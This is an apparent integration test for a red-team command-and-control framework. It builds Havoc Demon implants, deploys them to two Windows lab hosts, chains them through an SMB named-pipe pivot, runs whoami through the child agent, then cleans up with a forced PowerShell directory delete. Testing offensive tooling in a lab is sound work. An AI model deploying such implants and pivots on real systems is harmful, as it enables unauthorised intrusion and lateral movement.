"""
Scenario 10_pivot: Pivot chain dispatch

Tests a two-hop pivot chain where Agent A (pivot parent, directly connected
to the C2 server) relays traffic for Agent B (pivot child, connected to the
C2 server only through Agent A's internal SMB named-pipe listener).

Test steps (full path — requires ctx.windows and ctx.windows2):
  1. Create + start HTTP listener for the parent agent
  2. Build Demon EXE for host 1 (parent)
  3. Deploy + execute on host 1; wait for parent agent checkin
  4. Open an SMB pivot pipe on the parent agent
     (pivot smb connect \\\\.\\pipe\\<name>)
  5. Poll listener_list until the SMB pivot listener appears
  6. Build a second Demon EXE linked to the SMB pivot listener
  7. Deploy + execute on host 2; wait for child agent checkin through pivot
  8. Send `whoami` through the child agent; verify output is non-empty
  9. Verify agent topology: child's parent_id == parent agent ID
 10. Disconnect pivot (pivot smb disconnect <child-id>)
 11. Verify child agent transitions to inactive / unreachable
 12. Cleanup: kill agents, stop + delete listeners, remove payload files

Demon pivot implementation details (from src/Havoc/teamserver/pkg/agent/demons.go):
  COMMAND_PIVOT / DEMON_PIVOT_SMB_CONNECT  = 2520 / 10
  DEMON_PIVOT_SMB_DISCONNECT               = 2520 / 11
  DEMON_PIVOT_SMB_COMMAND                  = 2520 / 12

Skip conditions (applied in order — first match wins):
  A. Fewer than two target machines available.
  B. Only one Windows target — SMB pivot (Demon) requires Windows named pipes;
     this test cannot run with a single Windows host.
  C. Linux-only targets — Demon pivot uses Windows SMB; a TCP/bind pivot for
     Linux would require the Phantom agent which is not yet implemented.
  D. Mixed Linux + Windows — a Linux-hosted TCP pivot relay would need Phantom;
     cross-platform SMB is not supported by Demon.
  E. ctx.windows2 is None — second Windows slot not configured in targets.toml.

When any skip condition is met the test prints the reason and returns without
raising an exception, so the overall test suite still passes.
"""

DESCRIPTION = "Pivot chain dispatch"

import os
import tempfile
import uuid

from lib import ScenarioSkipped


def _short_id() -> str:
    """Return a short unique hex suffix to avoid name collisions across runs."""
    return uuid.uuid4().hex[:8]


# ── Skip-condition messages ──────────────────────────────────────────────────

_SKIP_ONE_TARGET = (
    "pivot chain requires two active agents on two separate hosts; "
    "only one (or zero) targets are configured"
)
_SKIP_MIXED_TARGETS = (
    "one Linux + one Windows target configured — "
    "SMB pivot requires two Windows hosts (Demon uses Windows named pipes); "
    "TCP/bind pivot from a Linux host requires the Phantom Linux agent "
    "which is not yet implemented — skipping until Phantom is available "
    "or a second Windows target is added to targets.toml"
)
_SKIP_LINUX_ONLY = (
    "only Linux targets available — Demon SMB pivot requires Windows; "
    "TCP pivot via Phantom Linux agent is not yet implemented"
)
_SKIP_NO_WINDOWS2 = (
    "ctx.windows2 is None — SMB pivot chain requires two Windows hosts; "
    "add a [windows2] section to config/targets.toml to enable "
    "(see config/targets.toml.example)"
)


def run(ctx):
    """
    Pivot chain dispatch scenario.

    ctx.cli      — CliConfig (red-cell-cli wrapper)
    ctx.linux    — TargetConfig | None
    ctx.windows  — TargetConfig | None   (pivot parent host)
    ctx.windows2 — TargetConfig | None   (pivot child host)
    ctx.env      — raw env.toml dict
    ctx.dry_run  — bool

    Raises AssertionError with a descriptive message on any failure.
    Prints a skip notice and returns cleanly when conditions are not met.
    """

    # ── C. Linux-only targets — Phantom not yet available ───────────────────
    if ctx.linux is not None and ctx.windows is None:
        raise ScenarioSkipped(_SKIP_LINUX_ONLY)

    # ── D. Mixed Linux + Windows — SMB pivot needs two Windows hosts ─────────
    if ctx.linux is not None and ctx.windows is not None:
        raise ScenarioSkipped(_SKIP_MIXED_TARGETS)

    # ctx.linux is None from here on.

    # ── A. No Windows target at all ──────────────────────────────────────────
    if ctx.windows is None:
        raise ScenarioSkipped(_SKIP_ONE_TARGET)

    # ── E. Second Windows target not configured ──────────────────────────────
    if ctx.windows2 is None:
        raise ScenarioSkipped(_SKIP_NO_WINDOWS2)

    from lib.deploy import DeployError, preflight_ssh
    for _target in (ctx.windows, ctx.windows2):
        try:
            preflight_ssh(_target)
        except DeployError as exc:
            raise ScenarioSkipped(str(exc)) from exc

    # Both Windows slots are present — run the full SMB pivot chain.
    _run_smb_pivot(ctx, parent_target=ctx.windows, child_target=ctx.windows2)


def _run_smb_pivot(ctx, parent_target, child_target):
    """Execute the full two-hop SMB pivot chain test.

    parent_target — Windows host 1: runs the HTTP-connected parent agent and
                    hosts the SMB named pipe.
    child_target  — Windows host 2: runs the child agent that connects through
                    the parent's SMB pivot pipe.
    """
    from lib.cli import (
        agent_exec,
        agent_kill,
        agent_list,
        agent_show,
        listener_create,
        listener_delete,
        listener_list,
        listener_start,
        listener_stop,
        payload_build_and_fetch,
    )
    from lib.deploy import ensure_work_dir, execute_background, run_remote, upload
    from lib.wait import TimeoutError as WaitTimeout
    from lib.wait import poll, wait_for_agent

    cli = ctx.cli
    uid = _short_id()
    listener_name = f"test-pivot-http-{uid}"
    pipe_name = f"red_cell_pivot_{uid}"
    pipe_path = f"\\\\.\\pipe\\{pipe_name}"
    listener_port = ctx.env.get("listeners", {}).get("windows_port", 19082)
    checkin_timeout = ctx.env.get("timeouts", {}).get("agent_checkin", 60)

    remote_parent_payload = f"{parent_target.work_dir}\\agent-parent-{uid}.exe"
    remote_child_payload = f"{child_target.work_dir}\\agent-child-{uid}.exe"
    _fd, local_parent = tempfile.mkstemp(suffix=".exe")
    os.close(_fd)
    _fd, local_child = tempfile.mkstemp(suffix=".exe")
    os.close(_fd)

    try:
        pre_existing_ids = {a["id"] for a in agent_list(cli)}
    except Exception:
        pre_existing_ids = set()

    parent_agent_id = None
    child_agent_id = None
    smb_listener_name = None

    try:
        # ── Step 1: Create + start HTTP listener ────────────────────────────
        print(f"  [step 1] creating HTTP listener {listener_name!r} on port {listener_port}")
        listener_create(cli, listener_name, "http", port=listener_port)
        listener_start(cli, listener_name)
        print("  [step 1] HTTP listener started")

        # ── Step 2: Build Demon EXE for parent host ──────────────────────────
        print("  [step 2] building Demon EXE (x64) for parent host")
        raw = payload_build_and_fetch(cli, listener=listener_name, arch="x64", fmt="exe")
        assert len(raw) > 0, "parent payload is empty"
        with open(local_parent, "wb") as fh:
            fh.write(raw)
        print(f"  [step 2] built ({len(raw)} bytes)")

        # ── Step 3: Deploy + execute on host 1; wait for parent checkin ─────
        print(f"  [step 3] deploying parent payload to {parent_target.host}")
        ensure_work_dir(parent_target)
        upload(parent_target, local_parent, remote_parent_payload)
        execute_background(parent_target, remote_parent_payload)
        print(f"  [step 3] waiting up to {checkin_timeout}s for parent agent checkin")

        parent = wait_for_agent(cli, timeout=checkin_timeout, pre_existing_ids=pre_existing_ids)
        parent_agent_id = parent["id"]
        print(f"  [step 3] parent agent checked in: {parent_agent_id}")

        # ── Step 4: Open SMB pivot pipe on parent agent ──────────────────────
        print(f"  [step 4] opening SMB pivot pipe {pipe_path!r} on parent agent")
        agent_exec(
            cli, parent_agent_id, f"pivot smb connect {pipe_path}",
            wait=True, timeout=30,
        )
        print("  [step 4] pivot smb connect sent")

        # ── Step 5: Poll listener_list until SMB pivot listener appears ──────
        print("  [step 5] polling for SMB pivot listener in listener_list")

        def _smb_listener_appeared():
            listeners = listener_list(cli)
            return [
                lst for lst in listeners
                if lst.get("type") == "smb" and pipe_name in lst.get("name", "")
            ]

        smb_listeners = poll(
            fn=_smb_listener_appeared,
            predicate=lambda ls: len(ls) > 0,
            timeout=30,
            description="SMB pivot listener appearance",
        )
        smb_listener_name = smb_listeners[0]["name"]
        print(f"  [step 5] SMB pivot listener appeared: {smb_listener_name!r}")

        # ── Step 6: Build Demon EXE linked to SMB pivot listener ─────────────
        print(f"  [step 6] building Demon EXE (x64) linked to {smb_listener_name!r}")
        raw = payload_build_and_fetch(
            cli, listener=smb_listener_name, arch="x64", fmt="exe"
        )
        assert len(raw) > 0, "child payload is empty"
        with open(local_child, "wb") as fh:
            fh.write(raw)
        print(f"  [step 6] built ({len(raw)} bytes)")

        # ── Step 7: Deploy + execute on host 2; wait for child checkin ───────
        all_known_ids = pre_existing_ids | {parent_agent_id}
        print(f"  [step 7] deploying child payload to {child_target.host}")
        ensure_work_dir(child_target)
        upload(child_target, local_child, remote_child_payload)
        execute_background(child_target, remote_child_payload)
        print(f"  [step 7] waiting up to {checkin_timeout}s for child agent checkin through pivot")

        child = wait_for_agent(cli, timeout=checkin_timeout, pre_existing_ids=all_known_ids)
        child_agent_id = child["id"]
        print(f"  [step 7] child agent checked in: {child_agent_id}")

        # ── Step 8: Send whoami through child agent; verify output ───────────
        print("  [step 8] running whoami on child agent")
        result = agent_exec(cli, child_agent_id, "whoami", wait=True, timeout=30)
        whoami_out = result.get("output", "").strip()
        assert whoami_out, "child agent whoami returned empty output"
        assert "\\" in whoami_out, (
            f"child agent whoami output {whoami_out!r} does not look like "
            f"DOMAIN\\username — unexpected format"
        )
        print(f"  [step 8] whoami passed: {whoami_out!r}")

        # ── Step 9: Verify agent topology ────────────────────────────────────
        print("  [step 9] verifying agent topology (child.parent_id == parent)")
        child_info = agent_show(cli, child_agent_id)
        child_parent_id = child_info.get("parent_id") or child_info.get("pivot_parent")
        assert child_parent_id == parent_agent_id, (
            f"child agent parent_id {child_parent_id!r} "
            f"!= parent agent ID {parent_agent_id!r}"
        )
        print(f"  [step 9] topology verified")

        # ── Step 10: Disconnect pivot ─────────────────────────────────────────
        print(f"  [step 10] disconnecting SMB pivot (child {child_agent_id})")
        agent_exec(
            cli, parent_agent_id, f"pivot smb disconnect {child_agent_id}",
            wait=True, timeout=30,
        )
        print("  [step 10] pivot smb disconnect sent")

        # ── Step 11: Verify child transitions to inactive ─────────────────────
        print("  [step 11] verifying child agent transitions to inactive/unreachable")

        def _child_inactive():
            try:
                info = agent_show(cli, child_agent_id)
                return info.get("status") in ("inactive", "dead", "disconnected")
            except Exception:
                # Agent removed from list also satisfies the condition.
                return True

        poll(
            fn=_child_inactive,
            predicate=lambda result: result,
            timeout=30,
            description="child agent goes inactive after pivot disconnect",
        )
        print("  [step 11] child agent is inactive")

        print("  all pivot chain steps passed")

    finally:
        # ── Step 12: Cleanup ──────────────────────────────────────────────────
        for aid in (child_agent_id, parent_agent_id):
            if aid:
                try:
                    agent_kill(cli, aid)
                except Exception as exc:
                    print(f"  [cleanup] agent kill {aid} failed (non-fatal): {exc}")

        if smb_listener_name:
            for fn in (listener_stop, listener_delete):
                try:
                    fn(cli, smb_listener_name)
                except Exception:
                    pass

        for fn in (listener_stop, listener_delete):
            try:
                fn(cli, listener_name)
            except Exception:
                pass

        for target_val, work_dir, local_path in [
            (parent_target, parent_target.work_dir, local_parent),
            (child_target, child_target.work_dir, local_child),
        ]:
            try:
                run_remote(
                    target_val,
                    f'powershell -Command "Remove-Item -Recurse -Force -Path \'{work_dir}\'"',
                    timeout=15,
                )
            except Exception as exc:
                print(f"  [cleanup] work_dir removal on {target_val.host} failed (non-fatal): {exc}")
            try:
                os.unlink(local_path)
            except Exception:
                pass

        print("  [cleanup] done")
